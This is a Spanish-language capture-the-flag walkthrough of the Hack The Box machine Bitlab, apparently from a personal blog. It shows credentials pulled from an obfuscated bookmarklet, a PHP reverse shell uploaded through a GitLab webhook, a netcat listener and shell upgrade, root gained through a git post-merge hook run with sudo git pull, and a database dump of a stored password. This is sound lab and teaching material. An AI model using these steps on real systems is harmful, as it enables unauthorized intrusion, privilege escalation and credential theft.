<!doctype html>
<html lang=es>

<head>
    <meta charset=utf-8>
    <meta http-equiv=x-ua-compatible content="ie=edge">
    <meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
    <meta name=author content="pruthvirajbhat">
    <meta name=description content="Resumen rápido Primero que nada, tengo que dejar claro que esta máquina tiene dos formas de hacer escalamiento de privilegios: una es haciendo ingenieria inversa y la otra es aprovecharse de una mala configuración de sudo y git. Voy a describir los pasos para sudo + git, como recién estoy empezando a dar mis primeros pasos en cosas de bajo nivel. A pesar de todo, en el futuro actualizaré este post para reflejar el camino vía ingeniera inversa.">
    <meta name=keywords content="CTF,Security,HTB,Blog,Infosec,linux,htb-medium,php,rce,git,web,ssh,sudo">
    <meta name=robots content="noodp">
    <meta name=theme-color content="#252627">
    <link rel=canonical href=https://pruthvirajbhat.github.io/es/posts/2020/01/hack-the-box-bitlab/>
    <title>Hack The Box - Bitlab :: Pruthvi's Ground Report</title>
    <link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css rel=stylesheet type=text/css>
    <link rel=stylesheet href=https://pruthvirajbhat.github.io/main.min.5dcefbf8102eb536dd3e2de53ffebfa58599ab2435c241a0db81728a5e015f2e.css>
    <link rel=stylesheet type=text/css href=https://pruthvirajbhat.github.io/css/scroll.css>
    <link rel=apple-touch-icon sizes=180x180 href=https://pruthvirajbhat.github.io/apple-touch-icon.png>
    <link rel=icon type=image/png sizes=32x32 href=https://pruthvirajbhat.github.io/favicon-32x32.png>
    <link rel=icon type=image/png sizes=16x16 href=https://pruthvirajbhat.github.io/favicon-16x16.png>
    <link rel=manifest href=https://pruthvirajbhat.github.io/site.webmanifest>
    <link rel=mask-icon href=https://pruthvirajbhat.github.io/safari-pinned-tab.svg color=#252627>
    <link rel="shortcut icon" href=https://pruthvirajbhat.github.io/favicon.ico>
    <meta name=msapplication-TileColor content="#252627">
    <meta name=theme-color content="#252627">
    <meta itemprop=name content="Hack The Box - Bitlab">
    <meta itemprop=description content="Mi paso a paso de Bitlab de Hack The Box.">
    <meta itemprop=datePublished content="2020-01-11T00:00:00+00:00">
    <meta itemprop=dateModified content="2020-01-11T00:00:00+00:00">
    <meta itemprop=wordCount content="1936">
    <meta itemprop=image content="https://pruthvirajbhat.github.io/images/htb/bitlab/bitlab-header.jpg">
    <meta itemprop=keywords content="linux,htb-medium,php,rce,git,web,ssh,sudo,">
    <meta name=twitter:card content="summary_large_image">
    <meta name=twitter:image content="https://pruthvirajbhat.github.io/images/htb/bitlab/bitlab-header.jpg">
    <meta name=twitter:title content="Hack The Box - Bitlab">
    <meta name=twitter:description content="Mi paso a paso de Bitlab de Hack The Box.">
    <meta property="article:section" content="Hack the Box">
    <meta property="article:published_time" content="2020-01-11 00:00:00 +0000 UTC">
</head>

<body class=dark-theme>
    <div class=container>
        <header class=header><span class=header__inner><a href=https://pruthvirajbhat.github.io/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
            <span class=logo__text>about@me$</span>
            <span class=logo__cursor style=background-color:gray></span></div>
    </a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=https://pruthvirajbhat.github.io/es/about/>About</a></li><li><a href=https://pruthvirajbhat.github.io/es/posts/2020/04/hacking/oscp-cheatsheet/>Cheatsheet</a></li><li><a href=https://pruthvirajbhat.github.io/es/posts/>Posts</a></li><li><a href=https://pruthvirajbhat.github.io/es/posts/2020/12/hacking-resources/>Resources</a></li><li><a href=https://pruthvirajbhat.github.io/es/tags/>Tags</a></li><li><a href=https://pruthvirajbhat.github.io/es/posts/2021/03/my-videos/>Videos</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span>
    <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span>
    </span>
    </span>
    </header>
    <div class=content>
        <div class=post>
            <div class=post-info>
                <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>10
                    minutos | Also available in
                    <a href=https://pruthvirajbhat.github.io/posts/2020/01/hack-the-box-bitlab/><span class="flag flag-icon flag-icon-us flag-icon-squared"></span></a>
                </p>
            </div>
            <h2 class=post-title><a href=https://pruthvirajbhat.github.io/es/posts/2020/01/hack-the-box-bitlab/>Hack The Box - Bitlab</a>
            </h2>
            <div class=post-meta><span class=post-date>2020-01-11</span></div><span class=post-tags>#<a href=https://pruthvirajbhat.github.io/tags/linux/>linux</a>&nbsp;
#<a href=https://pruthvirajbhat.github.io/tags/htb-medium/>htb-medium</a>&nbsp;
#<a href=https://pruthvirajbhat.github.io/tags/php/>php</a>&nbsp;
#<a href=https://pruthvirajbhat.github.io/tags/rce/>rce</a>&nbsp;
#<a href=https://pruthvirajbhat.github.io/tags/git/>git</a>&nbsp;
#<a href=https://pruthvirajbhat.github.io/tags/web/>web</a>&nbsp;
#<a href=https://pruthvirajbhat.github.io/tags/ssh/>ssh</a>&nbsp;
#<a href=https://pruthvirajbhat.github.io/tags/sudo/>sudo</a>&nbsp;</span>
            <div class=post-content>
                <div id=TableOfContents>
                    <ul>
                        <li><a href=#resumen-r%c3%a1pido>Resumen rápido</a></li>
                        <li><a href=#nmap>Nmap</a></li>
                        <li><a href=#enumeraci%c3%b3n-web>Enumeración Web</a></li>
                        <li><a href=#rce---www-data---root>RCE -> www-data -> root</a></li>
                        <li><a href=#m%c3%a1s-all%c3%a1-de-root>Más allá de root</a></li>
                        <li><a href=#usuario>Usuario</a></li>
                    </ul>
                </div><img src=https://pruthvirajbhat.github.io/images/htb/bitlab/info-card.png class=center style=border-radius:8px>
                <h2 id=resumen-rápido>Resumen rápido</h2>
                <p>Primero que nada, tengo que dejar claro que esta máquina tiene dos formas de hacer escalamiento de privilegios: una es haciendo ingenieria inversa y la otra es aprovecharse de una mala configuración de sudo y git. Voy a describir los pasos
                    para <code>sudo + git</code>, como recién estoy empezando a dar mis primeros pasos en cosas de bajo nivel. A pesar de todo, en el futuro actualizaré este post para reflejar el camino vía ingeniera inversa.</p>
                <p>Esta fue una máquina cool, no difícil a nivel técnico, pero una que se necesita enumerar muchísimo, entonces perfecta para mejorar en eso!</p>
                <p>Dicho eso, hora de ensuciarse las manos :D</p>
                <h2 id=nmap>Nmap</h2>
                <p>Comenzamos ejecutando nmap para obtener que puertos/servicios están expuestos:</p><pre><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# nmap -sC -sV -O 10.10.10.114 -o ininitial-nmap.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-12 22:33 EST
Nmap scan report for bitlab.htb (10.10.10.114)
Host is up (0.019s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)
|   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)
|_  256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519)
80/tcp open  http    nginx
| http-robots.txt: 55 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://bitlab.htb/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.2 - 4.9 (92%), Linux 3.18 (90%), Crestron XPanel control system (90%), Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec 12 22:34:15 2019 -- 1 IP address (1 host up) scanned in 17.39 seconds
</code></pre>
                <p>Obtenemos que SSH (22) y HTTP (80) están abiertos más que el servidor web ejecutándose en el puerto 80 es <a href=https://gitlab.com/>Gitlab</a>.</p>
                <h2 id=enumeración-web>Enumeración Web</h2>
                <p>La página de inicio (<code>http://10.10.10.114/</code>), solamente es la página de login standard de gitlab:</p><img src=https://pruthvirajbhat.github.io/images/htb/bitlab/1.1-web_enum.png class=center style=border-radius:8px>
                <p>Probamos a mano los enlaces en la página para ver si funciona, y encontramos con esto que <code>Help</code> funciona, somos redirigidos a un directorio listado que tiene <code>bookmarks.html</code> y lo abrimos:</p><img src=https://pruthvirajbhat.github.io/images/htb/bitlab/1.2-web_enum.png
                    class=center style=border-radius:8px>
                <img src=https://pruthvirajbhat.github.io/images/htb/bitlab/1.3-web_enum.png class=center style=border-radius:8px>
                <p>Vemos que <code>Gitlab Login</code> es código javascript ofuscado, pasamos a hacer desofusación (yo usé <a href=https://lelinhtinh.github.io/de4js/>de4js</a> pero cualquier herramienta de desofuscación o incluso la consola de python sirve):
                </p>
                <p>Del código:</p>
                <div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#a6e22e>javascript</span><span style=color:#f92672>:</span>(<span style=color:#66d9ef>function</span>(){ <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>_0x4b18</span><span style=color:#f92672>=</span>[<span style=color:#e6db74>&#34;\x76\x61\x6C\x75\x65&#34;</span>,<span style=color:#e6db74>&#34;\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E&#34;</span>,<span style=color:#e6db74>&#34;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&#34;</span>,<span style=color:#e6db74>&#34;\x63\x6C\x61\x76\x65&#34;</span>,<span style=color:#e6db74>&#34;\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64&#34;</span>,<span style=color:#e6db74>&#34;\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78&#34;</span>];document[<span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>2</span>]](<span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>1</span>])[<span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>0</span>]]<span style=color:#f92672>=</span> <span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>3</span>];document[<span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>2</span>]](<span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>4</span>])[<span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>0</span>]]<span style=color:#f92672>=</span> <span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>5</span>]; })()
</code></pre></div>
                <p>Obtenemos el siguiente:</p>
                <div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#a6e22e>javascript</span><span style=color:#f92672>:</span> (<span style=color:#66d9ef>function</span> () {
    <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>_0x4b18</span> <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#34;value&#34;</span>, <span style=color:#e6db74>&#34;user_login&#34;</span>, <span style=color:#e6db74>&#34;getElementById&#34;</span>, <span style=color:#e6db74>&#34;clave&#34;</span>, <span style=color:#e6db74>&#34;user_password&#34;</span>, <span style=color:#e6db74>&#34;11des0081x&#34;</span>];
    document[<span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>2</span>]](<span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>1</span>])[<span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>0</span>]] <span style=color:#f92672>=</span> <span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>3</span>];
    document[<span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>2</span>]](<span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>4</span>])[<span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>0</span>]] <span style=color:#f92672>=</span> <span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>5</span>];
})()
</code></pre></div>
                <p> un usuario llamado <code>clave</code> y con contraseñá <code>11des0081x</code>, nos logueamos exitosamente y tenemos acceso a algunos proyectos:</p><img src=https://pruthvirajbhat.github.io/images/htb/bitlab/1.5-web_enum.png class=center
                    style=border-radius:8px>
                <p>Si miramos detalladamente en <code>Profile</code> encontramos que este proyecto tiene <a href=https://docs.gitlab.com/ee/topics/autodevops/>Auto DevOps</a> habilitado. Seguimos enumerando un poco más, y vemos que el proyecto que se llama
                    <code>Deployer</code> está a cargo de manejar eso: deployear las aplicaciones, en la descripción hay un enlace apuntando a a gitlab, nos fijamos que hay en la documentación de <a href=https://docs.gitlab.com/ee/user/project/integrations/webhooks.html>webhooks</a>,
                    después de leer un poco, nos fijamos que hace <code>index.php</code>:</p><img src=https://pruthvirajbhat.github.io/images/htb/bitlab/1.6-web_enum.png class=center style=border-radius:8px>
                <img src=https://pruthvirajbhat.github.io/images/htb/bitlab/1.7-web_enum.png class=center style=border-radius:8px>
                <div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>

$input <span style=color:#f92672>=</span> <span style=color:#a6e22e>file_get_contents</span>(<span style=color:#e6db74>&#34;php://input&#34;</span>);
$payload  <span style=color:#f92672>=</span> <span style=color:#a6e22e>json_decode</span>($input);

$repo <span style=color:#f92672>=</span> $payload<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>project</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>name</span> <span style=color:#f92672>??</span> <span style=color:#e6db74>&#39;&#39;</span>;
$event <span style=color:#f92672>=</span> $payload<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>event_type</span> <span style=color:#f92672>??</span> <span style=color:#e6db74>&#39;&#39;</span>;
$state <span style=color:#f92672>=</span> $payload<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>object_attributes</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>state</span> <span style=color:#f92672>??</span> <span style=color:#e6db74>&#39;&#39;</span>;
$branch <span style=color:#f92672>=</span> $payload<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>object_attributes</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>target_branch</span> <span style=color:#f92672>??</span> <span style=color:#e6db74>&#39;&#39;</span>;

<span style=color:#66d9ef>if</span> ($repo<span style=color:#f92672>==</span><span style=color:#e6db74>&#39;Profile&#39;</span> <span style=color:#f92672>&amp;&amp;</span> $branch<span style=color:#f92672>==</span><span style=color:#e6db74>&#39;master&#39;</span> <span style=color:#f92672>&amp;&amp;</span> $event<span style=color:#f92672>==</span><span style=color:#e6db74>&#39;merge_request&#39;</span> <span style=color:#f92672>&amp;&amp;</span> $state<span style=color:#f92672>==</span><span style=color:#e6db74>&#39;merged&#39;</span>) {
    <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>shell_exec</span>(<span style=color:#e6db74>&#39;cd ../profile/; sudo git pull&#39;</span>),<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>;
}

<span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;OK</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>;
</code></pre></div>
                <p>Intentando combinar las piezas que tenemos hasta este momento, podemos darnos cuenta del punto de entrada: tenemos que subir un reverse shell en php, teniéndolo mergeado en master (el código de <code>index.php</code> tiene específicado
                    que un git pull se va a ejecutar si un merge a master sucede), una vez que hacemos eso ejecutamos <code>index.php</code> desde <code>Deployer</code> con esto vamos a tener nuestro reverse shell subido al servidor.</p>
                <h2 id=rce---www-data---root>RCE -> www-data -> root</h2>
                <p>Subimos el siguiente <a href=https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php>php reverse shell by pentestmonkey</a> cambiamos <code>$ip = '127.0.0.1'</code> y <code>$port = 1234</code> a nuestra ip
                    y puerto en los que nuestra máquina está escuchando, después lo mergeamos (vamos a ser redirigidos de forma automática a la página para mergearlo).</p>
                <p>Ahora que el reverse shell está subido en el servidor, todavía tenemos que ejecutarlo, para eso tenemos que saber cuál es la ruta para hacerlo, si recordamos el proyecto <code>Deployer</code> este tiene un index.php que imprime &ldquo;OK&rdquo;
                    , podemos ver de acceder al path de deployer para ver si se imprime, si lo hace, entonces sabemos que la ruta para nuestro reverse shell será <code>http://10.0.0.14/profile/&lt;name of our reverse shell></code>:</p><img src=https://pruthvirajbhat.github.io/images/htb/bitlab/1.rce.png
                    class=center style=border-radius:8px>
                <p>Ahora que sabemos efectivamente que la url mencionada arriba es la que precisamos usar. Ejecutamos nuestro listener para el reverse shell y lo ejecutamos, con esto tenemos ejecución de código remota:</p><pre><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.114] 57130
Linux bitlab 4.15.0-29-generic #31-Ubuntu SMP Tue Jul 17 15:39:52 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 19:56:40 up 12 min,  0 users,  load average: 0.55, 0.56, 0.46
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
www-data@bitlab:/var/www$ pwd
pwd
/var/www
</code></pre>
                <p>Verificamos si tenemos permisos de sudo, y vemos lo siguiente:</p><pre><code class=language-console data-lang=console>www-data@bitlab:/var/www$ sudo -l
sudo -l
Matching Defaults entries for www-data on bitlab:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bitlab:
    (root) NOPASSWD: /usr/bin/git pull
www-data@bitlab:/var/www$ getent passwd www-data
getent passwd www-data
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
www-data@bitlab:/tmp/profile$ cd /var/www/html/profile
cd /var/www/html/profile
www-data@bitlab:/var/www/html/profile$ ls -la
ls -la
total 144
drwxr-xr-x 3 root root  4096 Jan 10 19:56 .
drwxr-xr-x 5 root root  4096 Jul 30 12:37 ..
drwxr-xr-x 8 root root  4096 Jan 10 20:02 .git
-rw-r--r-- 1 root root    42 Feb 26  2019 .htaccess
-rw-r--r-- 1 root root   110 Jan  4  2019 README.md
-rw-r--r-- 1 root root 93029 Jan  5  2019 developer.jpg
-rw-r--r-- 1 root root  4184 Jan  4  2019 index.php
-rw-r--r-- 1 root root  5493 Jan 10 19:55 rev-sh.php    
</code></pre>
                <p>Hasta ahora, sabemos que los repositorios de git están en <code>/var/www/html</code> y que tenemos permitido ejecutar un git pull con permisos de sudo desde adentro de los repositorios, esto es lo que vamos a usar para aprovecharnos de
                    los webhooks habilitados en gitlab (post-merge hook) y nuestra capacidad de ejecutar el git pull con permisos de root (<code>git pull</code> es como git fetch pero mergea de una por decirlo de un modo), para entender mejor como esas
                    dos cosas funcionan nos vamos a la documentación de git para <a href=https://git-scm.com/docs/githooks#_post_merge>hooks: post merge</a> y la de <a href=https://git-scm.com/docs/git-pull>git pull</a>.</p>
                <p>Nuestro repositorio no nos permite editar archivos ahí, así que lo copiamos a un lugar donde podamos:</p><pre><code class=language-console data-lang=console>www-data@bitlab:/var/www/html$ cp -r profile /tmp/profile
cp -r profile /tmp/profile
www-data@bitlab:/tmp/profile$ ls -la
ls -la
total 148
drwxr-xr-x 4 www-data www-data  4096 Jan 10 20:08 .
drwxrwxrwt 3 root     root      4096 Jan 10 20:03 ..
drwxr-xr-x 8 www-data www-data  4096 Jan 10 20:03 .git
-rw-r--r-- 1 www-data www-data    42 Jan 10 20:03 .htaccess
-rw-r--r-- 1 www-data www-data   110 Jan 10 20:03 README.md
-rw-r--r-- 1 www-data www-data 93029 Jan 10 20:03 developer.jpg
-rw-r--r-- 1 www-data www-data  5493 Jan 10 20:03 foo
-rw-r--r-- 1 www-data www-data  4184 Jan 10 20:03 index.php
drwxr-xr-x 3 www-data www-data  4096 Jan 10 20:08 profile
-rw-r--r-- 1 www-data www-data  5493 Jan 10 20:03 rev-sh.php
</code></pre>
                <p>Creamos un script que se llama <code>post-merge</code> adentro de <code>.git/hooks</code> para conseguir un shell como root y le damos permisos de ejcución:</p><pre><code class=language-console data-lang=console>www-data@bitlab:/tmp/profile$ cd .git/hooks
cd .git/hooks
www-data@bitlab:/tmp/profile/.git/hooks$ echo 'exec /bin/bash 0&lt;&amp;2 1&gt;&amp;2' &gt; post-merge
&lt; 'exec /bin/bash 0&lt;&amp;2 1&gt;&amp;2' &gt; post-merge
www-data@bitlab:/tmp/profile/.git/hooks$ chmod u+x post-merge
chmod u+x post-merge
</code></pre>
                <p>Una vez que hicimos eso, subimos cualquier archivo (no importa cuál!) a gitlab y lo mergeamos, una vez que hacemos eso desde la ruta donde tenemos permisos, ejecutamos <code>sudo git pull</code> y con eso ahora somos root:</p><pre><code class=language-console data-lang=console>www-data@bitlab:/tmp/profile$ sudo git pull
sudo git pull
remote: Enumerating objects: 4, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (3/3), done.
Unpacking objects: 100% (3/3), done.
remote: Total 3 (delta 2), reused 0 (delta 0)
From ssh://localhost:3022/root/profile
   35da5b2..cbbc729  master     -&gt; origin/master
 * [new branch]      patch-2    -&gt; origin/patch-8
Updating 35da5b2..cbbc729
Fast-forward
 1asf | 1 +
 1 file changed, 1 insertion(+)
 create mode 100644 1asf
root@bitlab:/tmp/profile# id
id
uid=0(root) gid=0(root) groups=0(root)
root@bitlab:/tmp/profile# cd /root    
cd /root
root@bitlab:~# ls   
ls 
root.txt
root@bitlab:~# wc -c root.txt
wc -c root.txt
33 root.txt
</code></pre>
                <p>Con esto ya podemos irnos a ````/home``` y ver ahí la flag de user y de root.</p>
                <h2 id=más-allá-de-root>Más allá de root</h2>
                <p>Como dije en el principio del post, hay dos caminos para esta máquina: Ok, as I said at the begining of the post, there are 2 paths to get this box:</p>
                <p>1 - El modo &ldquo;pensado por el creado&rdquo; (user -> root) es haciendo ingenieria inversa. 2 - Aprovecharse de configuraciones mal hechas.</p>
                <p>Voy a cubrir el punto uno, pero solamente como hacerse con el usuario, y en el futuro si tengo idea de ingenieria inversa, voy a postear la parte que falta)</p>
                <h2 id=usuario>Usuario</h2>
                <p>En la página de inicio del proyecto Profile, hay un hint, se menciona una conexión a postgresql y snippets, nos vamos a la página de snippets y encontramos esto:</p><img src=https://pruthvirajbhat.github.io/images/htb/bitlab/1-intended_user.png
                    class=center style=border-radius:8px>
                <p>Lo abrimos y vemos que es un script para conectarse a la base de datos y hacer un dump de los perfiles:</p>
                <div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
<span style=color:#a6e22e>$db_connection</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>pg_connect</span>(<span style=color:#e6db74>&#34;host=localhost dbname=profiles user=profiles password=profiles&#34;</span>);
<span style=color:#a6e22e>$result</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>pg_query</span>(<span style=color:#a6e22e>$db_connection</span>, <span style=color:#e6db74>&#34;SELECT * FROM profiles&#34;</span>);
</code></pre></div>
                <p>Entonces, desde adentro del proyecto Profile agregamos un archivo con ese código, pero también creamos un array con <code>pg_fetch_all($result)</code> para guardarnos todos los perfiles que se les hace un dump, con eso tenemos este resultado:
                </p>
                <div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
<span style=color:#a6e22e>$db_connection</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>pg_connect</span>(<span style=color:#e6db74>&#34;host=localhost dbname=profiles user=profiles password=profiles&#34;</span>);
<span style=color:#a6e22e>$result</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>pg_query</span>(<span style=color:#a6e22e>$db_connection</span>, <span style=color:#e6db74>&#34;SELECT * FROM profiles&#34;</span>);
<span style=color:#a6e22e>$arr</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>pg_fetch_all</span>(<span style=color:#a6e22e>$result</span>);
<span style=color:#a6e22e>print_r</span>(<span style=color:#a6e22e>$arr</span>);
</code></pre></div>
                <p>Y despué de guardarlos y hacerle merge, nos vamos a <code>http://10.10.10.114/profile/&lt;el nombre que le diste al script></code>, y deberíamos tener como resultado el array en pantalla con el usuario <code>clave</code> y una contraseñá:</p>
                <div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js>Array ( [<span style=color:#ae81ff>0</span>] =&gt; Array ( [<span style=color:#a6e22e>id</span>] =&gt; <span style=color:#ae81ff>1</span> [<span style=color:#a6e22e>username</span>] =&gt; <span style=color:#a6e22e>clave</span> [<span style=color:#a6e22e>password</span>] =&gt; <span style=color:#a6e22e>c3NoLXN0cjBuZy1wQHNz</span><span style=color:#f92672>==</span> ) )
</code></pre></div>
                <p>Antes de intentar romperla por fuerza bruta, probamos usarla así como está, y éxito! La contraseña era esa, no estaba encriptada!</p><pre><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# ssh 10.10.10.114 -l clave
clave@10.10.10.114's password: 
Last login: Fri Jan 10 19:45:16 2020 from 10.10.14.7
clave@bitlab:~$ id
uid=1000(clave) gid=1000(clave) groups=1000(clave)
clave@bitlab:~$ ls -la
total 44
drwxr-xr-x 4 clave clave  4096 Aug  8 14:40 .
drwxr-xr-x 3 root  root   4096 Feb 28  2019 ..
lrwxrwxrwx 1 root  root      9 Feb 28  2019 .bash_history -&gt; /dev/null
-rw-r--r-- 1 clave clave  3771 Feb 28  2019 .bashrc
drwx------ 2 clave clave  4096 Aug  8 14:40 .cache
drwx------ 3 clave clave  4096 Aug  8 14:40 .gnupg
-rw-r--r-- 1 clave clave   807 Feb 28  2019 .profile
-r-------- 1 clave clave 13824 Jul 30 19:58 RemoteConnection.exe
-r-------- 1 clave clave    33 Feb 28  2019 user.txt
clave@bitlab:~$ wc -c user.txt 
33 user.txt
</code></pre>
                <p>Obtenemos el shell del usuario, y después de listar archivos en su home, vemos un archivo interesante que se llama <code>RemoteConnection.exe</code>, desde ahí vamos a necesitar descargarlo y empezar a ensuciarnos un poco las manos con
                    algun debugger y hacer ingenieria inversa para ver que esconde adentro, perooo como dije antes, lo voy a actualizar en el momento en que aprenda a hacerlo :P.</p>
                <p>Bueno, entonces sabemos que esta máquina tiene dos formas de conseguir root. Me encantó esta máquina, y estoy esperando a tirarme al agua con ella de nuevo cuando tenga un poquito más de idea de ing. inversa.</p>
                <p>Ta luego, hasta el próximo paso a paso!</p>
            </div>
            <div class=pagination>
                <div class=pagination__title><span class=pagination__title-h>Read other posts</span>
                    <hr>
                </div>
                <div class=pagination__buttons><span class="button previous"><a href=https://pruthvirajbhat.github.io/es/posts/2020/02/hack-the-box-ai/><span class=button__icon>←</span>
                    <span class=button__text>Hack The Box - AI</span></a>
                    </span>
                    <span class="button next"><a href=https://pruthvirajbhat.github.io/es/posts/2020/01/hack-the-box-craft/><span class=button__text>Hack The Box - Craft</span>
                    <span class=button__icon>→</span></a>
                    </span>
                </div>
            </div>
            <script src=https://utteranc.es/client.js repo=ceso/blog-source issue-term=title label="comments :speech_balloon:" theme=github-dark crossorigin=anonymous async></script>
            <script src=https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js></script><a href=javascript: id=return-to-top><i class=icon-chevron-up></i></a>
            <link href=//netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.css rel=stylesheet>
        </div>
    </div>
    <footer class=footer>
        <div class=footer__inner>
            <div class=footer__content><span>&copy; 2020</span>
